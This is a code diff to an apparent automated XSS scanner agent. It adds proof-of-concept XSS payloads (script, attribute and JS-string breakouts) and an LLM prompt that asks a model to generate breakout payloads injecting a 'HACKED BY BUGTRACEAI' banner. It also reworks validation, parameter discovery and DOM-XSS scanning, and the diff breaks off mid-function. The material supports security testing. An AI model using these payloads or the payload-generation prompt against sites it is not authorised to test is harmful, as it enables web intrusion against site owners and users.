@@ -61,6 +61,10 @@ from bugtrace.agents.mixins.tech_context import TechContextMixin
 from bugtrace.utils.payload_amplifier import PayloadAmplifier
 from bugtrace.tools.go_bridge import GoFuzzerBridge, FuzzResult, Reflection
 
+# v3.3: ManipulatorOrchestrator for Python-only HTTP attack campaigns
+from bugtrace.tools.manipulator.orchestrator import ManipulatorOrchestrator
+from bugtrace.tools.manipulator.models import MutableRequest, MutationStrategy
+
 logger = get_logger("agents.xss_v4")
 
 
@@ -102,6 +106,7 @@ class XSSFinding:
     bypass_explanation: str = ""
     exploit_url: str = ""
     exploit_url_encoded: str = ""
+    http_method: str = "GET"  # HTTP method used for exploitation (GET or POST)
     verification_methods: List[Dict] = field(default_factory=list)
     verification_warnings: List[str] = field(default_factory=list)
     reproduction_steps: List[str] = field(default_factory=list)
@@ -199,6 +204,17 @@ class XSSAgent(BaseAgent, TechContextMixin):
         "<noscript><p title=\"</noscript><img src=x onerror=alert(document.domain)>\">",
         "<form><math><mtext></form><form><mglyph><svg><mtext><style><path id=</style><img src=x onerror=alert(document.domain)>",
     ]
+
+    # L0.5 Smart context-specific payloads (NEVER alert(1) — always real impact)
+    SMART_PAYLOADS = {
+        "js_sq_breakout": "\\';document.title=document.domain//",
+        "js_dq_breakout": "\\\";document.title=document.domain//",
+        "html_svg": "<svg onload=document.title=document.domain>",
+        "html_img": "<img src=x onerror=document.title=document.domain>",
+        "attr_dq_breakout": "\" onmouseover=document.title=document.domain x=\"",
+        "attr_sq_breakout": "' onmouseover=document.title=document.domain x='",
+        "script_breakout": "</script><script>document.title=document.domain</script>",
+    }
 
     def __init__(
         self,
@@ -597,7 +613,8 @@ class XSSAgent(BaseAgent, TechContextMixin):
             )
 
         # =====================================================================
-        # STEP 2: Test regular candidates from Go fuzzer (original logic)
+        # STEP 2: Test regular candidates from Go fuzzer
+        # v3.3: HTTP-first validation - only browser if HTTP can't confirm
         # =====================================================================
         if not fuzz_result.reflections:
             return None
@@ -613,66 +630,97 @@ class XSSAgent(BaseAgent, TechContextMixin):
             reverse=True
         )
 
+        # Skip encoded reflections unless in very dangerous context
+        candidates = [
+            r for r in candidates
+            if not r.encoded or r.context in ("javascript", "event_handler")
+        ]
+
+        if not candidates:
+            return None
+
         dashboard.log(
-            f"[{self.name}] 🎯 Phase 5.2: Validating {len(candidates)} regular candidates",
+            f"[{self.name}] 🎯 Phase 5.2: Validating {len(candidates)} candidates (HTTP-first)",
             "INFO"
         )
 
-        # Validate top candidates (limit to prevent slowdown)
-        max_validations = 10
-        validated_count = 0
-
-        for reflection in candidates[:max_validations]:
+        # --- PASS 1: HTTP validation (fast, no browser) ---
+        browser_candidates = []
+        for reflection in candidates[:15]:
             if self._max_impact_achieved:
                 break
 
             payload = reflection.payload
-            dashboard.set_current_payload(payload[:50], "XSS Validation", "Validating")
+            dashboard.set_current_payload(payload[:50], "XSS HTTP Check", "Validating")
 
-            # Skip encoded reflections unless in very dangerous context
-            if reflection.encoded and reflection.context not in ("javascript", "event_handler"):
+            # Re-send payload and check HTTP response for confirmation
+            response_html = await self._send_payload(param, payload)
+            if not response_html:
                 continue
 
-            validated_count += 1
-            logger.debug(
-                f"[{self.name}] Validating candidate: {payload[:60]}... "
-                f"(context={reflection.context}, encoded={reflection.encoded})"
-            )
-
-            # Use browser validation for accurate confirmation
-            evidence = await self._validate_via_browser(self.url, param, payload)
-
-            if evidence:
+            evidence = {}
+            if self._can_confirm_from_http_response(payload, response_html, evidence):
                 dashboard.log(
-                    f"[{self.name}] ✅ XSS CONFIRMED via browser validation!",
+                    f"[{self.name}] ✅ XSS CONFIRMED via HTTP analysis (no browser needed)!",
                     "SUCCESS"
                 )
-
                 finding = self._create_xss_finding(
-                    param=param,
-                    payload=payload,
+                    param=param, payload=payload,
                     context=f"Hybrid Engine: {reflection.context}",
-                    validation_method="hybrid_go_playwright",
-                    evidence=evidence,
-                    confidence=0.95,
+                    validation_method="hybrid_go_http",
+                    evidence=evidence, confidence=0.90,
                     reflection_type=reflection_type,
                     surviving_chars=surviving_chars,
                     successful_payloads=[payload],
                     injection_ctx=injection_ctx,
                     bypass_technique=f"breakout_{reflection.context}",
-                    bypass_explanation=f"Go fuzzer detected reflection in {reflection.context}, validated via Playwright"
+                    bypass_explanation=f"Go fuzzer detected reflection, HTTP response confirmed executable XSS"
                 )
-
-                # Learn successful breakout
                 self._update_learned_breakouts(payload)
-
                 return finding
 
-        if validated_count > 0:
+            # Payload reflects but HTTP can't confirm → browser candidate
+            if payload in (response_html or ""):
+                browser_candidates.append(reflection)
+
+        # --- PASS 2: Browser validation (slow, only for promising reflections) ---
+        if browser_candidates:
             dashboard.log(
-                f"[{self.name}] Phase 5: {validated_count} candidates tested, none confirmed",
-                "WARN"
+                f"[{self.name}] Phase 5.2b: Browser validation for {min(len(browser_candidates), 5)} promising reflections",
+                "INFO"
             )
+            for reflection in browser_candidates[:5]:
+                if self._max_impact_achieved:
+                    break
+
+                payload = reflection.payload
+                dashboard.set_current_payload(payload[:50], "XSS Browser", "Validating")
+
+                evidence = await self._validate_via_browser(self.url, param, payload)
+                if evidence:
+                    dashboard.log(
+                        f"[{self.name}] ✅ XSS CONFIRMED via browser validation!",
+                        "SUCCESS"
+                    )
+                    finding = self._create_xss_finding(
+                        param=param, payload=payload,
+                        context=f"Hybrid Engine: {reflection.context}",
+                        validation_method="hybrid_go_playwright",
+                        evidence=evidence, confidence=0.95,
+                        reflection_type=reflection_type,
+                        surviving_chars=surviving_chars,
+                        successful_payloads=[payload],
+                        injection_ctx=injection_ctx,
+                        bypass_technique=f"breakout_{reflection.context}",
+                        bypass_explanation=f"Go fuzzer detected reflection in {reflection.context}, validated via Playwright"
+                    )
+                    self._update_learned_breakouts(payload)
+                    return finding
+
+        dashboard.log(
+            f"[{self.name}] Phase 5: {len(candidates)} candidates tested, none confirmed",
+            "WARN"
+        )
 
         return None
 
@@ -738,6 +786,79 @@ class XSSAgent(BaseAgent, TechContextMixin):
         # Playwright confirmed but Vision didn't see banner
         # Still return evidence but without vision_confirmed
         return evidence
+
+    # =========================================================================
+    # AUTO-VALIDATION: Override BaseAgent validation with XSS-specific logic
+    # =========================================================================
+
+    def _validate_before_emit(self, finding: Dict) -> tuple[bool, str]:
+        """
+        XSS-specific validation before emitting finding.
+
+        Requirements for XSS findings:
+        1. Basic validation (type, url) from BaseAgent
+        2. Must have evidence dict
+        3. Evidence should have confirmation (screenshot, alert_triggered, or vision_confirmed)
+        4. Payload should look like XSS (not conversational)
+
+        Args:
+            finding: Finding dict (the nested 'finding' key from event payload)
+
+        Returns:
+            (is_valid, error_message) tuple
+        """
+        # Call parent validation first (checks type, url, conversational payloads)
+        is_valid, error = super()._validate_before_emit(finding)
+        if not is_valid:
+            return False, error
+
+        # XSS-specific validation
+        evidence = finding.get("evidence", {})
+
+        # Check for proof of execution
+        has_screenshot = evidence.get("screenshot") or evidence.get("screenshot_path")
+        has_alert = evidence.get("alert_triggered")
+        has_vision = evidence.get("vision_confirmed")
+        has_interactsh = evidence.get("interactsh_callback")
+        has_http_confirmed = evidence.get("http_confirmed") or evidence.get("manipulator_confirmed")
+
+        if not (has_screenshot or has_alert or has_vision or has_interactsh or has_http_confirmed):
+            return False, "XSS requires proof: screenshot, alert, vision confirmation, HTTP confirmation, or Interactsh callback"
+
+        # Payload sanity check (should have XSS chars)
+        payload = finding.get("payload", "")
+        if payload and not any(c in str(payload) for c in '<>\'"();`'):
+            return False, f"XSS payload missing attack characters: {payload[:50]}"
+
+        # All checks passed
+        return True, ""
+
+    def _emit_xss_finding(self, finding_dict: Dict, status: str = None, needs_cdp: bool = False):
+        """
+        Helper to emit XSS finding using BaseAgent.emit_finding() with validation.
+
+        Args:
+            finding_dict: The nested 'finding' dict with type, url, parameter, payload, etc.
+            status: Validation status (e.g., "VALIDATED_CONFIRMED")
+            needs_cdp: Whether finding needs CDP validation
+        """
+        # Wrap in full event structure
+        full_event = {
+            "specialist": "xss",
+            "finding": finding_dict,
+            "status": status or ValidationStatus.VALIDATED_CONFIRMED.value,
+            "validation_requires_cdp": needs_cdp,
+            "scan_context": self._scan_context,
+        }
+
+        # Use BaseAgent.emit_finding() which validates before emitting
+        result = self.emit_finding(finding_dict)
+
+        if result:
+            # Emit the full event structure for backward compatibility
+            from bugtrace.core.event_bus import EventType
+            if settings.WORKER_POOL_EMIT_EVENTS:
+                asyncio.create_task(self.event_bus.emit(EventType.VULNERABILITY_DETECTED, full_event))
 
     def _update_learned_breakouts(self, payload: str) -> None:
         """
@@ -1116,7 +1237,8 @@ Generate 10 visual versions of the working payloads. Return ONLY the payloads, o
         self,
         param: str,
         contexts: List[str],
-        sample_payloads: Dict[str, str]
+        sample_payloads: Dict[str, str],
+        html_snippet: str = ""
     ) -> List[str]:
         """
         Ask DeepSeek to generate payloads that inject visible HACKED BY BUGTRACEAI banner.
@@ -1125,6 +1247,7 @@ Generate 10 visual versions of the working payloads. Return ONLY the payloads, o
             param: Parameter name
             contexts: List of reflection contexts found (e.g., ["html_text", "attribute_value"])
             sample_payloads: Example payloads that reflected per context
+            html_snippet: Actual HTML around the reflection point for context-aware generation
 
         Returns:
             List of 10 visual payloads
@@ -1134,11 +1257,26 @@ Generate 10 visual versions of the working payloads. Return ONLY the payloads, o
         contexts_str = ", ".join(contexts)
         samples_str = "\n".join([f"- {ctx}: {p[:80]}..." for ctx, p in sample_payloads.items()])
 
+        # Build context-aware prompt section
+        snippet_section = ""
+        if html_snippet:
+            snippet_section = f"""
+ACTUAL HTML WHERE THE PARAMETER REFLECTS:
+```
+{html_snippet[:500]}
+```
+Analyze this code carefully. Identify:
+- What quote type wraps the reflection (single, double, backtick)
+- What escaping the server applies (backslash doubling, HTML encoding)
+- The exact breakout sequence needed to escape THIS specific context
+Generate payloads that exploit THIS specific reflection, not generic payloads.
+"""
+
         prompt = f"""You are an XSS payload expert. I found reflections in these contexts: {contexts_str}
 
 Sample payloads that reflected:
 {samples_str}
-
+{snippet_section}
 Generate exactly 10 XSS payloads that will:
 1. Break out of the current context
 2. Inject a VISIBLE RED BANNER with text "HACKED BY BUGTRACEAI"
@@ -1147,6 +1285,7 @@ CRITICAL RULES FOR JAVASCRIPT CONTEXTS:
 - If context is javascript_string or script, quotes are often escaped (\\' or \\")
 - Use BACKTICKS (`) instead of quotes for all string literals inside the payload
 - Use \\'; or \\"; to break out of strings with backslash escaping
+- If the server escapes \\ to \\\\ but does NOT escape single quotes, use \\'; to break out
 - Example working payload: \\';var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//
 
 FOR HTML CONTEXTS, use this pattern:
@@ -2439,47 +2578,6 @@ Pipeline V2 completed all phases but could not confirm XSS execution.
 
         return False, ""
 
-    def _determine_validation_status(self, finding_data: Dict) -> Tuple[str, bool]:
-        """
-        Determine if finding should be marked VALIDATED_CONFIRMED or sent to AgenticValidator.
-        More authoritative: Reduces load on AgenticValidator by confirming clear wins here.
-
-        Returns:
-            Tuple of (status_string, validated_bool)
-            - ("VALIDATED_CONFIRMED", True) if high confidence
-            - ("PENDING_VALIDATION", False) if needs AgenticValidator
-        """
-        evidence = finding_data.get("evidence", {})
-
-        # TIER 1: VALIDATED_CONFIRMED (High confidence / Definitive proof)
-        if self._has_interactsh_hit(evidence):
-            return "VALIDATED_CONFIRMED", True
-
-        if self._has_dialog_detected(evidence):
-            return "VALIDATED_CONFIRMED", True
-
-        if self._has_vision_proof(evidence, finding_data):
-            return "VALIDATED_CONFIRMED", True
-
-        if self._has_dom_mutation_proof(evidence):
-            return "VALIDATED_CONFIRMED", True
-
-        if self._has_console_execution_proof(evidence):
-            return "VALIDATED_CONFIRMED", True
-
-        if self._has_dangerous_unencoded_reflection(evidence, finding_data):
-            return "VALIDATED_CONFIRMED", True
-
-        if self._has_fragment_xss_with_screenshot(finding_data):
-            return "VALIDATED_CONFIRMED", True
-
-        if evidence.get("http_confirmed") or evidence.get("ai_confirmed"):
-            return "VALIDATED_CONFIRMED", True
-
-        # TIER 2: All findings go direct to reporting (CDP disabled)
-        # v3.2.1: XSSAgent validates everything, no CDP escalation
-        return "VALIDATED_CONFIRMED", True
-
     def _has_interactsh_hit(self, evidence: Dict) -> bool:
         """Check for Interactsh OOB interaction."""
         if evidence.get("interactsh_hit"):
@@ -2511,28 +2609,35 @@ Pipeline V2 completed all phases but could not confirm XSS execution.
     def _determine_validation_status(self, test_result: Dict) -> Tuple[str, bool]:
         """
         Determine validation status based on evidence authority.
-        XSSAgent now has AUTHORITY to mark VALIDATED_CONFIRMED if evidence is strong.
+        XSSAgent has AUTHORITY to mark VALIDATED_CONFIRMED only if evidence is strong.
+        Falls back to PENDING_VALIDATION when no evidence checks pass.
         """
         evidence = test_result.get("evidence", {})
-        finding_data = test_result.get("finding_data", {}) # Pass finding_data if available
+        finding_data = test_result.get("finding_data", test_result)
 
         # AUTHORITY CHECKS: Only if self-validation is enabled in config
         if settings.XSS_SELF_VALIDATE:
+            if self._has_interactsh_hit(evidence):
+                return "VALIDATED_CONFIRMED", True
+
             if (self._has_dialog_detected(evidence) or
                 self._has_vision_proof(evidence, finding_data) or
                 self._has_dom_mutation_proof(evidence) or
                 self._has_console_execution_proof(evidence) or
                 self._has_dangerous_unencoded_reflection(evidence, finding_data) or
                 self._has_fragment_xss_with_screenshot(finding_data)):
-                
+
                 logger.info(f"[{self.name}] 🚨 SELF-VALIDATED XSS (Authority Evidence Found)")
+                return "VALIDATED_CONFIRMED", True
+
+            if evidence.get("http_confirmed") or evidence.get("ai_confirmed"):
                 return "VALIDATED_CONFIRMED", True
         else:
             logger.debug(f"[{self.name}] Self-validation disabled in config. Deferring to Auditor.")
 
-        # FALLBACK: All findings go direct to reporting (CDP disabled)
-        # v3.2.1: XSSAgent validates everything, no CDP escalation
-        return "VALIDATED_CONFIRMED", True
+        # FALLBACK: No evidence checks passed — needs external validation
+        logger.debug(f"[{self.name}] No authority evidence found, marking PENDING_VALIDATION")
+        return "PENDING_VALIDATION", False
 
     def _has_console_execution_proof(self, evidence: Dict) -> bool:
         """Check for console output with execution proof."""
@@ -2571,6 +2676,8 @@ Pipeline V2 completed all phases but could not confirm XSS execution.
             True if evidence is strong enough to warrant a finding
             False if evidence is too weak (just log internally)
         """
+        evidence = test_result.get("evidence", {})
+
         # ACCEPT: Confirmed via HTTP analysis or AI Auditor
         if evidence.get("http_confirmed") or evidence.get("ai_confirmed"):
             return True
@@ -2823,97 +2930,85 @@ Pipeline V2 completed all phases but could not confirm XSS execution.
         logger.info(f"[{self.name}] Phase 3.5: DOM XSS Headless Scan")
 
         try:
-            dom_findings = await detect_dom_xss(self.url)
+            # Collect URLs to test: self.url + internal links from discovery
+            urls_to_test = [self.url]
+            if hasattr(self, '_discovered_internal_urls') and self._discovered_internal_urls:
+                urls_to_test.extend(self._discovered_internal_urls)
+            logger.info(f"[{self.name}] DOM XSS scanning {len(urls_to_test)} URLs")
+
+            # Gap 3 Fix: Pass discovered param names so DOM XSS tests each param individually
+            # (e.g., ?back=CANARY, ?searchTerm=CANARY) instead of only ?xss=CANARY
+            discovered_param_names = None
+            if hasattr(self, '_discovered_params') and self._discovered_params:
+                discovered_param_names = list(self._discovered_params.keys())
+            elif hasattr(self, '_last_all_params') and self._last_all_params:
+                discovered_param_names = list(self._last_all_params.keys())
+
+            dom_findings = []
+            for test_url in urls_to_test:
+                try:
+                    url_findings = await asyncio.wait_for(
+                        detect_dom_xss(test_url, discovered_params=discovered_param_names),
+                        timeout=90
+                    )
+                    if url_findings:
+                        dom_findings.extend(url_findings)
+                except asyncio.TimeoutError:
+                    logger.warning(f"[{self.name}] DOM XSS timeout (90s) for {test_url}, skipping")
+                except Exception as e:
+                    logger.debug(f"[{self.name}] DOM XSS scan failed for {test_url}: {e}")
 
             if not dom_findings:
-                dashboard.log(f"[{self.name}] No DOM XSS candidates found", "INFO")
+                dashboard.log(f"[{self.name}] No DOM XSS candidates found across {len(urls_to_test)} URLs", "INFO")
                 return
 
             dashboard.log(
-                f"[{self.name}] 🔍 Found {len(dom_findings)} DOM XSS candidates, validating visually...",
+                f"[{self.name}] 🔍 Found {len(dom_findings)} DOM XSS candidates from {len(urls_to_test)} URLs, validating visually...",
                 "INFO"
             )
 
             confirmed_count = 0
+
             for df in dom_findings:
-                # Visual validation: screenshot + Vision AI
-                evidence = await self._validate_dom_xss_visually(
+                sink = df.get("sink", "")
+                source_str = df.get("source", "unknown")
+                param_name = source_str.split(":")[-1] if ":" in source_str else source_str
+
+                # DOM XSS detector already confirmed: payload reached the sink
+                # (via JS hook, console side channel, or page.evaluate).
+                # No vision needed — the browser-level proof IS the confirmation.
+                confirmed_count += 1
+                self.findings.append(XSSFinding(
                     url=df["url"],
+                    parameter=param_name,
                     payload=df["payload"],
-                    sink=df["sink"],
-                    source=df["source"],
-                    screenshots_dir=screenshots_dir
+                    context="dom_xss",
+                    validation_method="dom_xss_hook_confirmed",
+                    evidence={
+                        "sink": sink,
+                        "source": source_str,
+                        "hook_confirmed": True,
+                        "validation_note": f"Payload reached {sink} sink — confirmed by Playwright runtime hook"
+                    },
+                    confidence=0.95,
+                    status="VALIDATED_CONFIRMED",
+                    validated=True,
+                    reflection_context=source_str,
+                    successful_payloads=[df["payload"]]
+                ))
+                dashboard.log(
+                    f"[{self.name}] ✅ DOM XSS CONFIRMED via hook: {sink} (param: {param_name})",
+                    "SUCCESS"
                 )
-
-                if evidence and evidence.get("vision_confirmed"):
-                    # CONFIRMED: Vision AI saw execution proof
-                    confirmed_count += 1
-                    self.findings.append(XSSFinding(
-                        url=df["url"],
-                        parameter=df["source"],
-                        payload=df["payload"],
-                        context="dom_xss",
-                        validation_method="dom_xss_vision_confirmed",
-                        evidence=evidence,
-                        confidence=0.99,  # High confidence with visual proof
-                        status="VALIDATED_CONFIRMED",
-                        validated=True,
-                        reflection_context=df["source"],
-                        successful_payloads=[df["payload"]]
-                    ))
-                    dashboard.log(
-                        f"[{self.name}] ✅ DOM XSS CONFIRMED via Vision: {df['sink']}",
-                        "SUCCESS"
-                    )
-                else:
-                    # Not visually confirmed with original payload
-                    # Try generating alternative visual payloads via DeepSeek
-                    logger.info(
-                        f"[{self.name}] Original payload not visually confirmed, "
-                        f"trying alternative payloads for sink={df['sink']}..."
-                    )
-
-                    alt_evidence = await self._try_alternative_dom_payloads(
-                        url=df["url"],
-                        sink=df["sink"],
-                        source=df["source"],
-                        original_payload=df["payload"],
-                        screenshots_dir=screenshots_dir
-                    )
-
-                    if alt_evidence and alt_evidence.get("vision_confirmed"):
-                        confirmed_count += 1
-                        self.findings.append(XSSFinding(
-                            url=df["url"],
-                            parameter=df["source"],
-                            payload=alt_evidence.get("working_payload", df["payload"]),
-                            context="dom_xss",
-                            validation_method="dom_xss_alt_payload_vision",
-                            evidence=alt_evidence,
-                            confidence=0.99,
-                            status="VALIDATED_CONFIRMED",
-                            validated=True,
-                            reflection_context=df["source"],
-                            successful_payloads=[alt_evidence.get("working_payload")]
-                        ))
-                        dashboard.log(
-                            f"[{self.name}] ✅ DOM XSS CONFIRMED via alternative payload!",
-                            "SUCCESS"
-                        )
-                    else:
-                        logger.warning(
-                            f"[{self.name}] DOM XSS candidate not confirmed after {alt_evidence.get('attempts', 0) if alt_evidence else 0} attempts: "
-                            f"sink={df['sink']}"
-                        )
 
             if confirmed_count > 0:
                 dashboard.log(
-                    f"[{self.name}] 🎯 DOM XSS: {confirmed_count}/{len(dom_findings)} visually confirmed!",
+                    f"[{self.name}] 🎯 DOM XSS: {confirmed_count}/{len(dom_findings)} confirmed!",
                     "SUCCESS"
                 )
             else:
                 dashboard.log(
-                    f"[{self.name}] ⚠️ DOM XSS: {len(dom_findings)} candidates, 0 visually confirmed",
+                    f"[{self.name}] ⚠️ DOM XSS: {len(dom_findings)} candidates, 0 confirmed",
                     "WARN"
                 )
 
@@ -3093,10 +3188,15 @@ Return ONLY the payloads, one per line, no explanations."""
                     # and inject via script
                     test_url = url
                 else:
-                    # Try in query string
+                    # Try in query string — use param name from source if available
                     params = parse_qs(parsed.query)
-                    # Find likely param or use first one
-                    param_name = list(params.keys())[0] if params else "input"
+                    # Extract param name from source (e.g., "param:returnPath" → "returnPath")
+                    if source and ":" in source:
+                        param_name = source.split(":")[-1]
+                    elif source and source.startswith("location."):
+                        param_name = list(params.keys())[0] if params else "input"
+                    else:
+                        param_name = list(params.keys())[0] if params else "input"
                     params[param_name] = [payload]
                     test_url = urlunparse((
                         parsed.scheme, parsed.netloc, parsed.path,
@@ -3176,12 +3276,94 @@ Return ONLY the payloads, one per line, no explanations."""
         logger.info(f"[{self.name}] Phase A: Drained {len(wet_findings)} WET findings")
         if not wet_findings:
             return []
+
+        # ARCHITECTURE: ALWAYS keep original WET params + ADD discovered params
+        logger.info(f"[{self.name}] Phase A: Expanding WET findings with XSS-focused discovery...")
+        expanded_wet_findings = []
+        seen_urls = set()
+        seen_params = set()
+
+        # 1. Always include ALL original WET params first (DASTySAST signals)
+        for wet_item in wet_findings:
+            url = wet_item.get("url", "")
+            param = wet_item.get("parameter", "") or (wet_item.get("finding", {}) or {}).get("parameter", "")
+            if param and (url, param) not in seen_params:
+                seen_params.add((url, param))
+                # Propagate http_method from finding or default GET
+                if "http_method" not in wet_item:
+                    wet_item["http_method"] = (wet_item.get("finding", {}) or {}).get("http_method") or "GET"
+                expanded_wet_findings.append(wet_item)
+
+        # 2. Discover additional params per unique URL
+        for wet_item in wet_findings:
+            url = wet_item.get("url", "")
+            if url in seen_urls:
+                continue
+            seen_urls.add(url)
+
+            try:
+                all_params = await self._discover_xss_params(url)
+                # Gap 3 Fix: Store discovered params for DOM XSS parameter-aware testing
+                self._last_all_params = all_params
+                if not all_params:
+                    continue
+
+                new_count = 0
+                param_meta = getattr(self, '_param_metadata', {})
+                for param_name, param_value in all_params.items():
+                    if (url, param_name) not in seen_params:
+                        seen_params.add((url, param_name))
+                        pm = param_meta.get(param_name, {})
+                        expanded_wet_findings.append({
+                            "url": url,
+                            "parameter": param_name,
+                            "context": wet_item.get("context", "html"),
+                            "finding": wet_item.get("finding", {}),
+                            "scan_context": wet_item.get("scan_context", self._scan_context),
+                            "_discovered": True,
+                            "http_method": getattr(self, '_param_methods', {}).get(param_name, "GET"),
+                            "param_source": pm.get("source", "unknown"),
+                            "form_enctype": pm.get("enctype", ""),
+                            "form_action": pm.get("action_url", ""),
+                        })
+                        new_count += 1
+
+                if new_count:
+                    logger.info(f"[{self.name}] 🔍 Discovered {new_count} additional params on {url}")
+
+            except Exception as e:
+                logger.error(f"[{self.name}] Discovery failed for {url}: {e}")
+
+        # 2.5 Resolve endpoint URLs from HTML links/forms + reasoning fallback
+        from bugtrace.agents.specialist_utils import resolve_param_endpoints, resolve_param_from_reasoning
+        if hasattr(self, '_last_discovery_html') and self._last_discovery_html:
+            for base_url in seen_urls:
+                endpoint_map = resolve_param_endpoints(self._last_discovery_html, base_url)
+                # Fallback: extract endpoints from DASTySAST reasoning text
+                reasoning_map = resolve_param_from_reasoning(expanded_wet_findings, base_url)
+                for k, v in reasoning_map.items():
+                    if k not in endpoint_map:
+                        endpoint_map[k] = v
+                if endpoint_map:
+                    resolved_count = 0
+                    for item in expanded_wet_findings:
+                        if item.get("url") == base_url:
+                            param = item.get("parameter", "")
+                            if param in endpoint_map and endpoint_map[param] != base_url:
+                                item["url"] = endpoint_map[param]
+                                resolved_count += 1
+                    if resolved_count:
+                        logger.info(f"[{self.name}] 🔗 Resolved {resolved_count} params to actual endpoint URLs")
+
+        logger.info(f"[{self.name}] Phase A: Expanded {len(wet_findings)} hints → {len(expanded_wet_findings)} testable params")
+
+        # Now deduplicate the expanded list
         try:
-            dry_list = await self._llm_analyze_and_dedup(wet_findings, self._scan_context)
+            dry_list = await self._llm_analyze_and_dedup(expanded_wet_findings, self._scan_context)
         except:
-            dry_list = self._fallback_fingerprint_dedup(wet_findings)
+            dry_list = self._fallback_fingerprint_dedup(expanded_wet_findings)
         self._dry_findings = dry_list
-        logger.info(f"[{self.name}] Phase A: {len(wet_findings)} WET → {len(dry_list)} DRY ({len(wet_findings)-len(dry_list)} duplicates removed)")
+        logger.info(f"[{self.name}] Phase A: {len(expanded_wet_findings)} WET → {len(dry_list)} DRY ({len(expanded_wet_findings)-len(dry_list)} duplicates removed)")
         return dry_list
 
     async def _llm_analyze_and_dedup(self, wet_findings: List[Dict], context: str) -> List[Dict]:
@@ -3232,11 +3414,21 @@ Return ONLY the payloads, one per line, no explanations."""
    - Event handlers (onclick, onerror, onfocus) are BLOCKED by Angular/Vue/React CSP
    - THIS IS CRITICAL: Event handler payloads WILL FAIL on these frameworks
 3. Apply context-aware deduplication:
-   - Same URL + param + SAME context type → DUPLICATE
+   - **CRITICAL:** If items have "_discovered": true, they are DIFFERENT PARAMETERS discovered autonomously
+   - Even if they share the same "finding" object, treat them as SEPARATE based on "parameter" field
+   - Same URL + DIFFERENT param → DIFFERENT (keep all)
    - Same URL + param + DIFFERENT context type → DIFFERENT (keep both)
    - Different endpoints → DIFFERENT (keep both)
+   - ONLY mark as DUPLICATE if: Same URL + Same param + Same context
 4. Prioritize findings based on framework exploitability
 5. Filter findings unlikely to succeed given the tech stack
+6. **ATTACK STRATEGY REASONING**: For each finding, reason about the BEST way to attack it:
+   - Consider the http_method (GET vs POST — POST params must be sent in form body, not URL)
+   - Consider the param_source (form_input, url_query, anchor_href)
+   - Consider form_enctype if present (multipart vs url-encoded)
+   - Consider the reflection context and server escaping behavior from the reasoning
+   - Example: "POST form param reflecting unescaped in HTML text. Use visual DOM payload via POST body."
+   - Example: "GET param in JS single-quoted string. Server escapes backslash to double-backslash but NOT quotes. Backslash-quote breakout: \\' followed by JS payload."
 
 ## OUTPUT FORMAT (JSON only, no markdown):
 {{
@@ -3245,6 +3437,8 @@ Return ONLY the payloads, one per line, no explanations."""
       "url": "...",
       "parameter": "...",
       "context": "html_body|attribute|javascript|url|css",
+      "http_method": "GET or POST (preserve from input, default GET)",
+      "attack_strategy": "Brief reasoning about HOW to exploit this param considering method, context, escaping",
       "rationale": "why this is unique and exploitable",
       "attack_priority": 1-5,
       "recommended_payload_type": "svg|img|script|event_handler|template"
@@ -3265,6 +3459,28 @@ Return ONLY the payloads, one per line, no explanations."""
             dry_data = json.loads(response)
             dry_list = dry_data.get("findings", wet_findings)
 
+            # Post-LLM merge: ensure deterministic fields are preserved (LLM may drop them)
+            wet_meta_map = {}
+            for wf in wet_findings:
+                key = (wf.get("url", ""), wf.get("parameter", ""))
+                wet_meta_map[key] = {
+                    "http_method": wf.get("http_method", "GET"),
+                    "param_source": wf.get("param_source", ""),
+                    "form_enctype": wf.get("form_enctype", ""),
+                    "form_action": wf.get("form_action", ""),
+                }
+            for df in dry_list:
+                key = (df.get("url", ""), df.get("parameter", ""))
+                wet_meta = wet_meta_map.get(key, {})
+                if not df.get("http_method"):
+                    df["http_method"] = wet_meta.get("http_method", "GET")
+                if not df.get("param_source"):
+                    df["param_source"] = wet_meta.get("param_source", "")
+                if not df.get("form_enctype"):
+                    df["form_enctype"] = wet_meta.get("form_enctype", "")
+                if not df.get("form_action"):
+                    df["form_action"] = wet_meta.get("form_action", "")
+
             logger.info(f"[{self.name}] LLM deduplication: {dry_data.get('reasoning', 'No reasoning provided')}")
             return dry_list
 
@@ -3281,34 +3497,895 @@ Return ONLY the payloads, one per line, no explanations."""
                 dry_list.append(f)
         return dry_list
 
+    async def _discover_xss_params(self, url: str) -> Dict[str, str]:
+        """
+        XSS-focused parameter discovery for a given URL.
+
+        Extracts ALL testable parameters from:
+        1. URL query string
+        2. HTML forms (input, textarea, select)
+        3. JavaScript variables (var x = "USER_INPUT")
+
+        Returns:
+            Dict mapping param names to default values
+            Example: {"category": "Juice", "searchTerm": "", "filter": ""}
+
+        Architecture Note:
+            Specialists must be AUTONOMOUS - they discover their own attack surface.
+            The finding from DASTySAST is just a "signal" that the URL is interesting.
+            We IGNORE the specific parameter and test ALL discoverable params.
+        """
+        from bugtrace.tools.visual.browser import browser_manager
+        from bugtrace.agents.specialist_utils import extract_param_metadata
+        from urllib.parse import urlparse, parse_qs, urljoin
+        from bs4 import BeautifulSoup
+        import re
+
+        all_params = {}
+        self._param_methods = {}  # Track HTTP method per param (GET/POST)
+        self._param_metadata = {}  # Full metadata from centralized extraction
+
+        # 1-3. Centralized extraction: URL query + HTML forms + anchor hrefs
+        try:
+            state = await browser_manager.capture_state(url)
+            html = state.get("html", "")
+        except Exception as e:
+            logger.warning(f"[{self.name}] Failed to fetch HTML: {e}")
+            html = ""
+
+        # Extract URL params even without HTML
+        try:
+            parsed = urlparse(url)
+            url_params = parse_qs(parsed.query)
+            for param_name, values in url_params.items():
+                all_params[param_name] = values[0] if values else ""
+                self._param_methods[param_name] = "GET"
+        except Exception as e:
+            logger.warning(f"[{self.name}] Failed to parse URL params: {e}")
+
+        if html:
+            self._last_discovery_html = html  # Cache for URL resolution
+
+            # Centralized metadata extraction (deterministic ground truth)
+            self._param_metadata = extract_param_metadata(html, url)
+            for param_name, meta in self._param_metadata.items():
+                if param_name not in all_params:
+                    all_params[param_name] = meta.get("default_value", "")
+                self._param_methods[param_name] = meta["method"]
+
+            # 4. XSS-specific: Extract JavaScript variables (not in shared util)
+            try:
+                js_var_pattern = r'var\s+(\w+)\s*=\s*["\']([^"\']*)["\']'
+                for match in re.finditer(js_var_pattern, html):
+                    var_name, var_value = match.groups()
+                    if var_name not in all_params and len(var_name) > 2:
+                        all_params[var_name] = var_value
+            except Exception:
+                pass
+
+            # 5. XSS-specific: Extract internal links for DOM XSS coverage
